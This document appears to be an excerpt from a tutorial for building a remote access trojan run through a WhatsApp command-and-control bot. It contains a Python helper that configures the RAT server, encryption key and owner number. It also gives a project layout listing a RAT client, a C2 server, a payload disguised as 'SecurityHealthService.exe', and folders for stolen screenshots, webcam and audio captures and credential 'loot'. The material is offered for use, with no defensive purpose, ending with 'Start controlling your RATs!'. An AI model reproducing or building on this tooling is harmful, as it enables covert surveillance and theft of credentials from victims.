#!/usr/bin/env python3
"""
Configuration Helper for WhatsApp C2
"""

import json
import os
from cryptography.fernet import Fernet

def main():
    print("""
╔════════════════════════════════════════════════════════════╗
║        T0OL-B4S3-263 WhatsApp C2 Configuration            ║
╚════════════════════════════════════════════════════════════╝
    """)
    
    config = {}
    
    # RAT Server Configuration
    print("[1/4] RAT Server Configuration")
    config['ratServer'] = {}
    config['ratServer']['host'] = input("  Server IP [127.0.0.1]: ").strip() or "127.0.0.1"
    config['ratServer']['port'] = int(input("  Server Port [4444]: ").strip() or "4444")
    
    # Generate or use existing key
    print("\n[2/4] Encryption Key")
    use_existing = input("  Use existing key from t0ol_config.json? (y/n) [y]: ").strip().lower()
    
    if use_existing != 'n' and os.path.exists('t0ol_config.json'):
        with open('t0ol_config.json', 'r') as f:
            tool_config = json.load(f)
            if 'encryption_key' in tool_config:
                config['ratServer']['encryptionKey'] = tool_config['encryption_key']
                print(f"  ✓ Using key from t0ol_config.json")
            else:
                config['ratServer']['encryptionKey'] = Fernet.generate_key().decode()
                print(f"  ✓ Generated new key")
    else:
        config['ratServer']['encryptionKey'] = Fernet.generate_key().decode()
        print(f"  ✓ Generated new key: {config['ratServer']['encryptionKey'][:20]}...")
    
    config['ratServer']['apiPort'] = 5000
    
    # WhatsApp Configuration
    print("\n[3/4] WhatsApp Configuration")
    config['whatsapp'] = {}
    config['whatsapp']['botName'] = "T0OL-B4S3-263 C2"
    config['whatsapp']['prefix'] = "/"
    
    owner_number = input("  Your WhatsApp number (with country code, e.g., 1234567890): ").strip()
    config['whatsapp']['ownerNumbers'] = [f"{owner_number}@s.whatsapp.net"]
    
    # Features
    print("\n[4/4] Feature Configuration")
    config['features'] = {
        'autoSaveMedia': True,
        'maxCommandTimeout': 60000,
        'enableNotifications': True
    }
    
    # Save configuration
    config_path = 'whatsapp-c2/config.json'
    with open(config_path, 'w') as f:
        json.dump(config, f, indent=2)
    
    print(f"\n✓ Configuration saved to {config_path}")
    
    # Update API bridge
    print("\n[*] Updating API bridge configuration...")
    
    if os.path.exists('rat_api_bridge.py'):
        with open('rat_api_bridge.py', 'r') as f:
            content = f.read()
        
        content = content.replace(
            "ENCRYPTION_KEY = b'YOUR_ENCRYPTION_KEY_HERE'",
            f"ENCRYPTION_KEY = b'{config['ratServer']['encryptionKey']}'"
        )
        
        with open('rat_api_bridge.py', 'w') as f:
            f.write(content)
        
        print("✓ API bridge configured")
    
    print("""
╔════════════════════════════════════════════════════════════╗
║              CONFIGURATION COMPLETE!                       ║
╚════════════════════════════════════════════════════════════╝

Next steps:
1. Run: python start_whatsapp_c2.py
2. Scan QR code with WhatsApp
3. Send /help to the bot
4. Start controlling your RATs!
    """)

if __name__ == "__main__":
    main()
```

---

## **STEP 18: Complete Directory Structure**

Your final project should look like this:
```
t0ol-b4s3-263/
│
├── rat_ultimate.py              # RAT client
├── rat_server_fixed.py          # C2 server
├── rat_api_bridge.py            # API bridge for WhatsApp
├── t0ol-b4s3-263.py            # Main launcher
├── t0ol_config.json            # Main config
│
├── configure_whatsapp.py        # WhatsApp config helper
├── start_whatsapp_c2.py        # WhatsApp system launcher
├── install_whatsapp_c2.sh      # Quick installer
│
├── whatsapp-c2/
│   ├── package.json
│   ├── config.json
│   ├── bot.js                  # Main bot
│   ├── utils/
│   │   ├── formatter.js        # Response formatting
│   │   └── ratClient.js        # API client
│   ├── sessions/               # WhatsApp session data
│   └── node_modules/
│
├── output/
│   └── SecurityHealthService.exe
│
├── captures/                    # Bot will save media here
│   ├── screenshots/
│   ├── webcam/
│   └── audio/
│
└── loot/                       # Bot will save creds here
    └── [session_name]/